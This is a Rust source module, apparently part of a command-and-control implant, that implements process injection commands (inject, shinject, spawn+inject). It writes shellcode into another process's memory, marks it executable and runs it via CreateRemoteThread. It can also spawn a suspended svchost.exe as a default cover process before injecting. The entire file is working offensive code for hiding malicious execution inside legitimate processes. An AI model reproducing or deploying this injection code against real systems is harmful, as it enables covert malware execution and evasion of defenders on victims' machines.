//! Process injection — inject, shinject, spawn+inject.
//!
//! All Win32 calls are behind `#[cfg(target_os = "windows")]`.
//! Non-Windows builds get stubs that return an error string.

/// Default spawnto process when none is configured.
pub const DEFAULT_SPAWN_PROCESS: &str = r"C:\Windows\System32\svchost.exe";

// ─── Windows implementation ───────────────────────────────────────────

#[cfg(target_os = "windows")]
mod win {
    use super::DEFAULT_SPAWN_PROCESS;
    use anyhow::Result;
    use windows_sys::Win32::Foundation::{CloseHandle, GetLastError, BOOL, FALSE, HANDLE};
    use windows_sys::Win32::System::Memory::{
        VirtualAllocEx, VirtualProtectEx, MEM_COMMIT, MEM_RESERVE, PAGE_EXECUTE_READ,
        PAGE_READWRITE,
    };
    use windows_sys::Win32::System::Threading::{
        CreateProcessW, CreateRemoteThread, OpenProcess, ResumeThread, PROCESS_ALL_ACCESS,
        PROCESS_INFORMATION, STARTUPINFOW, CREATE_SUSPENDED,
    };

    extern "system" {
        fn WriteProcessMemory(
            hProcess: HANDLE,
            lpBaseAddress: *mut core::ffi::c_void,
            lpBuffer: *const core::ffi::c_void,
            nSize: usize,
            lpNumberOfBytesWritten: *mut usize,
        ) -> BOOL;
    }

    /// Core injection routine: allocate RW → write → flip to RX → CreateRemoteThread.
    /// Returns (exit_code, stdout, stderr).
    unsafe fn inject_into_process(
        process: HANDLE,
        shellcode: &[u8],
    ) -> (i32, String, String) {
        // Allocate RW memory in target process.
        let base = VirtualAllocEx(
            process,
            core::ptr::null(),
            shellcode.len(),
            MEM_COMMIT | MEM_RESERVE,
            PAGE_READWRITE,
        );
        if base.is_null() {
            return (
                1,
                String::new(),
                format!("VirtualAllocEx failed: error {}", GetLastError()),
            );
        }

        // Write shellcode.
        let mut written: usize = 0;
        if WriteProcessMemory(
            process,
            base,
            shellcode.as_ptr().cast(),
            shellcode.len(),
            &mut written,
        ) == FALSE
        {
            return (
                1,
                String::new(),
                format!("WriteProcessMemory failed: error {}", GetLastError()),
            );
        }

        // W^X: flip to RX.
        let mut old_protect: u32 = 0;
        if VirtualProtectEx(
            process,
            base,
            shellcode.len(),
            PAGE_EXECUTE_READ,
            &mut old_protect,
        ) == FALSE
        {
            return (
                1,
                String::new(),
                format!("VirtualProtectEx failed: error {}", GetLastError()),
            );
        }

        // Execute via CreateRemoteThread.
        let thread = CreateRemoteThread(
            process,
            core::ptr::null(),
            0,
            Some(core::mem::transmute(base)),
            core::ptr::null(),
            0,
            core::ptr::null_mut(),
        );
        if thread == 0 {
            return (
                1,
                String::new(),
                format!("CreateRemoteThread failed: error {}", GetLastError()),
            );
        }
        CloseHandle(thread);

        (
            0,
            format!(
                "[*] Injected {} bytes at {:p}, thread started",
                shellcode.len(),
                base
            ),
            String::new(),
        )
    }

    /// inject <pid> <shellcode>: inject into an existing process.
    pub fn inject(pid: u32, shellcode: &[u8]) -> Result<(i32, String, String)> {
        unsafe {
            let process = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
            if process == 0 {
                return Ok((
                    1,
                    String::new(),
                    format!("OpenProcess({}) failed: error {}", pid, GetLastError()),
                ));
            }

            let result = inject_into_process(process, shellcode);
            CloseHandle(process);
            Ok(result)
        }
    }

    /// shinject <pid> <path>: read shellcode from file then inject.
    pub fn shinject(pid: u32, shellcode_path: &str) -> Result<(i32, String, String)> {
        let shellcode = match std::fs::read(shellcode_path) {
            Ok(data) => data,
            Err(e) => {
                return Ok((
                    1,
                    String::new(),
                    format!("failed to read '{}': {}", shellcode_path, e),
                ))
            }
        };
        if shellcode.is_empty() {
            return Ok((1, String::new(), "shellcode file is empty".to_string()));
        }
        inject(pid, &shellcode)
    }

    /// spawn+inject: create suspended process, inject, resume.
    pub fn spawn_inject(
        shellcode: &[u8],
        spawn_exe: Option<&str>,
        config_spawn: Option<&str>,
    ) -> Result<(i32, String, String)> {
        let exe = spawn_exe
            .or(config_spawn)
            .unwrap_or(DEFAULT_SPAWN_PROCESS);

        let exe_w: Vec<u16> = exe.encode_utf16().chain(core::iter::once(0)).collect();

        unsafe {
            let mut si: STARTUPINFOW = core::mem::zeroed();
            si.cb = core::mem::size_of::<STARTUPINFOW>() as u32;
            let mut pi: PROCESS_INFORMATION = core::mem::zeroed();

            if CreateProcessW(
                exe_w.as_ptr(),
                core::ptr::null_mut(),
                core::ptr::null(),
                core::ptr::null(),
                FALSE,
                CREATE_SUSPENDED,
                core::ptr::null(),
                core::ptr::null(),
                &si,
                &mut pi,
            ) == FALSE
            {
                return Ok((
                    1,
                    String::new(),
                    format!(
                        "CreateProcessW('{}') failed: error {}",
                        exe,
                        GetLastError()
                    ),
                ));
            }

            let result = inject_into_process(pi.hProcess, shellcode);

            if result.0 != 0 {
                // Injection failed — clean up the suspended process.
                CloseHandle(pi.hThread);
                CloseHandle(pi.hProcess);
                return Ok(result);
            }

            // Resume the main thread.
            ResumeThread(pi.hThread);
            CloseHandle(pi.hThread);
            CloseHandle(pi.hProcess);

            Ok((
                0,
                format!(
                    "[*] Spawned '{}' (PID {}), injected {} bytes",
                    exe, pi.dwProcessId, shellcode.len()
                ),
                String::new(),
            ))
        }
    }
}

// ─── Non-Windows stubs ────────────────────────────────────────────────

#[cfg(not(target_os = "windows"))]
mod stub {
    use anyhow::Result;

    pub fn inject(_pid: u32, _shellcode: &[u8]) -> Result<(i32, String, String)> {
        Ok((1, String::new(), "inject requires Windows".to_string()))
    }

    pub fn shinject(_pid: u32, _shellcode_path: &str) -> Result<(i32, String, String)> {
        Ok((1, String::new(), "shinject requires Windows".to_string()))
    }

    pub fn spawn_inject(
        _shellcode: &[u8],
        _spawn_exe: Option<&str>,
        _config_spawn: Option<&str>,
    ) -> Result<(i32, String, String)> {
        Ok((
            1,
            String::new(),
            "spawn_inject requires Windows".to_string(),
        ))
    }
}

#[cfg(target_os = "windows")]
pub use win::{inject, shinject, spawn_inject};

#[cfg(not(target_os = "windows"))]
pub use stub::{inject, shinject, spawn_inject};
